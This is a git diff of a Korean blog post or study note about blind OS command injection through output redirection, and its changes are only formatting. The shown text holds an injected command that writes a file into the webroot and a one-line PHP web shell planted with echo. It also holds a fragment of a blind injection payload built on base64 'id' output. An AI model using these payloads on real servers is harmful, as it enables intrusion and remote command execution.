@@ -137,11 +137,13 @@ bash -c "a=\$(id | base64 -w 0); if [ \&{a:0:1} == 'd' ]; then cat /dev/urandom;
 
 ## 출력 리다이렉트를 통한 Blind OS Injection
 
+<div class="notice--primary" markdown="1">
+
 ```
 ?cmd=[입력값] & echo 'dected' > /var/www/html/dected.txt &
 ```
 
-echo 명령어 연계를 통해 웹루트 디렉터리 내에 dected.txt 파일 생성 후 dected 문자열을 삽입하게 된다. 이러한 방식을 통해 웹쉘 또한 출력 리다이렉트를 통해 업로드가 가능하다.
+- echo 명령어 연계를 통해 웹루트 디렉터리 내에 dected.txt 파일 생성 후 dected 문자열을 삽입하게 된다. 이러한 방식을 통해 웹쉘 또한 출력 리다이렉트를 통해 업로드가 가능하다
 
 ```
 echo '<?php system($_GET['cmd'])?.>' > /var/www/html/shell.php
@@ -149,11 +151,15 @@ echo '<?php system($_GET['cmd'])?.>' > /var/www/html/shell.php
 
 > 이 경우 웹쉘 업로드시 웹 서버가 지정한 파일이 업로드 되는 경로를 알고있어야 한다.
 
-보통 프레임워크 혹은 웹 어플리케이션에서는 Static File Directory를 사용한다.
+- 보통 프레임워크 혹은 웹 어플리케이션에서는 Static File Directory를 사용한다.
 
 <div class="notice">
   <h4>Static File Directory란 웹 서버에서 웹 페이지에 사용되는 정적 파일(HTML, CSS, JS, 이미지, 동영상 등)을 저장하는 디렉토리 이다.</h4>
 </div>
+
+
+</div>
+
 
 해당 디렉터리에 실행한 명령어의 결과를 파일로 생성 후, 해당 파일에 접근하여 결과를 확인할 수 있다.
 <br>
